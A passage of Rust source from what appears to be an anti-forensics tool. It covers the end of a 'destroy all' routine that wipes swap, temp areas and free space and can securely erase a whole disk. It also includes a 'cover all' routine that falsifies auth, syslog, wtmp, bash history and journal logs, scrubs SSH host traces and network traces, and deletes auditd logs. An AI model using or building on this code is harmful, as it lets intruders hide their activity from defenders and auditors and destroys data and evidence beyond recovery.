    eprintln!("\n[*] == Swap ==");
    if !dry {
        report.push("swap", wipe_all_swap(false));
    } else {
        report.push_ok("swap [dry-run]");
    }

    // 10. Temp areas
    eprintln!("\n[*] == Tmpfs ==");
    if !dry {
        let mut s = TmpfsStats::default();
        report.push("tmpfs", wipe_tmp_areas(&mut s));
    } else {
        report.push_ok("tmpfs [dry-run]");
    }

    // 11. FITRIM
    eprintln!("\n[*] == Trim ==");
    if !dry {
        let mut s = TrimStats::default();
        report.push("trim", trim_all_mounts(&mut s));
    } else {
        report.push_ok("trim [dry-run]");
    }

    // 12. Optional full disk nuke (NVMe → ATA → software fallback)
    if let Some(dev) = device {
        eprintln!("\n[*] == Full Disk Wipe: {} ==", dev);
        if !dry {
            let r = NvmeDev::secure_erase(dev)
                .or_else(|_| ata_secure_erase(dev))
                .or_else(|_| {
                    let opts = WipeOpts {
                        algo: WipeAlgo::Random,
                        verify_last: false,
                        verbose: true,
                    };
                    wipe_device(dev, &opts)
                });
            report.push("disk-nuke", r);
        } else {
            report.push_ok("disk-nuke [dry-run]");
        }
    }

    eprintln!("\n[+] DESTROY ALL complete.");
}

#[cfg(target_os = "linux")]
fn run_cover_all(dry: bool, replace: &[String], hosts: &[String], report: &mut Report) {
    eprintln!("\n[*] == Log Poison (cover) ==");
    if !dry {
        let replacements = parse_replacements(replace);
        let opts = LogpOpts {
            mode: LogpMode::Cover,
            replacements,
            scramble_ts: false,
            ts_window_start: 0,
            ts_window_end: 0,
            do_auth_log: true,
            do_syslog: true,
            do_wtmp: true,
            do_bash_history: true,
            do_journal: true,
            extra_logs: vec![],
            verbose: true,
        };
        let mut s = LogpStats::default();
        report.push("log-poison", log_poison(&opts, &mut s));
    } else {
        report.push_ok("log-poison [dry-run]");
    }

    eprintln!("\n[*] == SSH Clean ==");
    if !dry {
        let host_refs: Vec<&str> = hosts.iter().map(String::as_str).collect();
        let opts = SshCleanOpts {
            hosts: &host_refs,
            key_fragments: &[],
            destroy_all: false,
            wipe_keys: false,
            wipe_config: false,
        };
        let mut s = SshCleanStats::default();
        report.push("ssh-clean", ssh_clean(&opts, &mut s));
    } else {
        report.push_ok("ssh-clean [dry-run]");
    }

    eprintln!("\n[*] == Net Clean ==");
    if !dry {
        let mut s = NetCleanStats::default();
        net_clean_all(&mut s);
        report.push_ok("net-clean");
    } else {
        report.push_ok("net-clean [dry-run]");
    }

    eprintln!("\n[*] == Auditd ==");
    if !dry {
        let mut s = AuditStats::default();
        report.push("auditd", wipe_audit_logs(false, &mut s));
    } else {
        report.push_ok("auditd [dry-run]");
    }

    eprintln!("\n[+] COVER ALL complete.");
}
